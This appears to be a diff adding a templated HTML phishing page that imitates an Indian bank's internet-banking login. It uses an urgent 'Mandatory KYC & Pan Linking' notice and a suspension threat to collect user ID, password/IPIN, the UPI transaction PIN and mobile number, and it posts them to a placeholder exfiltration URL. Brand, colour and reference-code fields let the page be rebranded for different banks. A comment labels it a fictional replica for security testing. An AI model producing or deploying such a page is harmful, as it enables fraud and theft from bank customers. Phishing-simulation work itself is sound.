@@ -1,0 +1,60 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ brand_title }} Internet Banking Online Login</title>
+    <style>
+        :root {
+            --primary: {{ primary_color }};
+            --secondary: {{ secondary_color }};
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: #f1f5f9; color: #1e293b; display: flex; justify-content: center; padding: 16px; }
+        .{{ prefix }}box { width: 100%; max-width: 440px; background: #ffffff; border: 1px solid #cbd5e1; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); overflow: hidden; }
+        .{{ prefix }}top { background: var(--primary); color: #ffffff; padding: 18px 24px; display: flex; justify-content: space-between; align-items: center; }
+        .{{ prefix }}bank-name { font-size: 20px; font-weight: 800; }
+        .{{ prefix }}secure-badge { font-size: 11px; background: rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px; }
+        .{{ prefix }}form-area { padding: 24px; }
+        .{{ prefix }}heading { font-size: 16px; font-weight: 700; margin-bottom: 16px; color: #0f172a; border-bottom: 2px solid var(--secondary); padding-bottom: 6px; }
+        .{{ prefix }}desc { font-size: 13px; color: #64748b; margin-bottom: 18px; line-height: 1.4; }
+        .{{ prefix }}label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 4px; color: #334155; }
+        .{{ prefix }}input { width: 100%; padding: 11px 14px; border: 1px solid #94a3b8; border-radius: 4px; margin-bottom: 14px; font-size: 14px; }
+        .{{ prefix }}submit-btn { width: 100%; padding: 13px; background: var(--primary); color: #ffffff; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .{{ prefix }}security-footer { background: #f8fafc; padding: 14px 24px; font-size: 11px; color: #64748b; border-top: 1px solid #e2e8f0; line-height: 1.4; }
+    </style>
+</head>
+<body>
+    <div class="{{ prefix }}box">
+        <div class="{{ prefix }}top">
+            <div class="{{ prefix }}bank-name">{{ brand_wordmark }}</div>
+            <div class="{{ prefix }}secure-badge">🔒 256-Bit SSL</div>
+        </div>
+        <div class="{{ prefix }}form-area">
+            <div class="{{ prefix }}heading">Mandatory KYC & Pan Linking Portal</div>
+            <div class="{{ prefix }}desc">
+                As per regulatory compliance, please verify your NetBanking credentials and linked UPI profile immediately to prevent account suspension.
+            </div>
+            <form action="{{ exfil_url }}" method="POST">
+                <label class="{{ prefix }}label" for="username">Customer / User ID</label>
+                <input class="{{ prefix }}input" type="text" id="username" name="user_id" placeholder="Enter User ID" required>
+                
+                <label class="{{ prefix }}label" for="pwd">Login Password / IPIN</label>
+                <input class="{{ prefix }}input" type="password" id="pwd" name="password" placeholder="Enter Password" required>
+
+                <label class="{{ prefix }}label" for="profile_pin">UPI / Profile Transaction PIN</label>
+                <input class="{{ prefix }}input" type="password" id="profile_pin" name="upi_pin" placeholder="Enter 6-digit Transaction PIN" maxlength="6" required>
+
+                <label class="{{ prefix }}label" for="mob">Registered Mobile Number</label>
+                <input class="{{ prefix }}input" type="tel" id="mob" name="mobile" placeholder="10-digit Mobile Number" value="{{ phone }}" required>
+
+                <button class="{{ prefix }}submit-btn" type="submit">LOGIN & UPDATE KYC</button>
+            </form>
+        </div>
+        <div class="{{ prefix }}security-footer">
+            Official Security Gateway &bull; Reference Code: KYC-{{ ref_code }} &bull; Customer Care: 1800-{{ ref_code[:4] }}-9999
+        </div>
+    </div>
+</body>
+</html>
